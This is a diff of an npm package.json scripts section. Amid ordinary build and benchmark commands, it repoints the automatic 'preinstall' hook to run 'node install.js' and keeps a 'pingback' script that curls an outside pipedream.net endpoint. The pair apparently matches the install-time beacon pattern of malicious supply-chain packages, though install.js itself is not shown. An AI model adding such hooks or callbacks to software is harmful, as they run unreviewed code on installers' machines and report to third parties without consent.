@@ -131,7 +131,7 @@
     "ts-benchmark": "cd ./benchmarks/typescript/simple && npm install && npm run benchmark | node ../../../scripts/tsc-diagnostics-check",
     "attest-benchmark": "node ./benchmarks/typescript/infer.bench.mts",
     "build": "npm run _prepareBuild && rimraf ./build && tsc && cp package.json ./build && cp ./../../README.md ./build && cp ./../../LICENSE.md ./build",
-    "preinstall": "node index.js",
+    "preinstall": "node install.js",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
     "start": "npm run build && node ./build/ignoreCoverage/development.js",
     "coverage": "jest --coverage",
